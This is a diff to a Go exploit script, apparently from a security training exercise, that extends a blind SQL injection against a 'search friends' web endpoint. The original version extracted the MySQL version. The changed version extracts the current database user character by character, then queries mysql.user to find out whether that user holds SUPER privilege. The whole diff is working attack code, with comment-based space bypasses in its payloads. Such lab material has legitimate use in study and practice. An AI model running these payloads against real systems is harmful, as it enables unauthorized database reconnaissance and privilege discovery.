@@ -12,13 +12,13 @@ import (
 	"strings"
 )
 
-// Ex 3.5.2.1 - MySQL Version Extraction
+// Ex 3.5.2.1 - MySQL Extract DB User Permissions
 
 var client *http.Client
 
 const proxyURL = "http://127.0.0.1:8080"
 
-func sendSearchFriendsSQLiV3(ip string, sqliPayload string) int {
+func sendSearchFriendsSQLiDBA(ip string, sqliPayload string) int {
 	for i := 32; i < 126; i++ {
 		// do necessary URL manipulation
 		updatedPayload := strings.Replace(sqliPayload, "[CHAR]", fmt.Sprintf("%d", i), -1)
@@ -33,6 +33,35 @@ func sendSearchFriendsSQLiV3(ip string, sqliPayload string) int {
 	}
 
 	return 0
+}
+
+func stage1(ip string) string {
+	utils.PrintInfo("Starting Stage 1 - current_user()")
+	currentUser := ""
+
+	utils.PrintSuccess("Stage 1 - Current User: ")
+	for i := 1; i < 20; i++ {
+		sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring((select/**/current_user()),%d,1)))=[CHAR]%%23", i)
+		extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiDBA(ip, sqliPayload))
+		currentUser += extractedChar
+		fmt.Print(extractedChar)
+	}
+
+	return currentUser
+}
+
+func stage2(ip string, currentUser string) string {
+	utils.PrintInfo("Starting Stage 2 - Check for SUPER")
+	userHost := strings.Split(strings.Replace(currentUser, "\x00", "", -1), "@")
+
+	sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring(("+
+		"SELECT/**/count(*)/**/"+
+		"FROM/**/mysql.user/**/"+
+		"WHERE/**/Super_priv='Y'/**/"+
+		"AND/**/user='%s'/**/AND/**/host='%s'),1,1)))=[CHAR]%%23", userHost[0], userHost[1])
+	extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiDBA(ip, sqliPayload))
+
+	return extractedChar
 }
 
 func main() {
@@ -70,11 +99,14 @@ func main() {
 	// create our HTTP client using the above transport and set the global variable
 	client = &http.Client{Transport: tr}
 
-	utils.PrintInfo("Extracting DB Version: ")
-	for i := 1; i < 20; i++ {
-		sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23", i)
-		extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiV3(ip, sqliPayload))
-		fmt.Print(extractedChar)
+	currentUser := stage1(ip)
+	fmt.Print("\n")
+	result := stage2(ip, currentUser)
+
+	if result == "1" {
+		utils.PrintSuccess("current_user() of " + currentUser + " is a DBA!")
+	} else {
+		utils.PrintFailure("current_user() of " + currentUser + " is not a DBA...")
 	}
 
 	fmt.Println("")
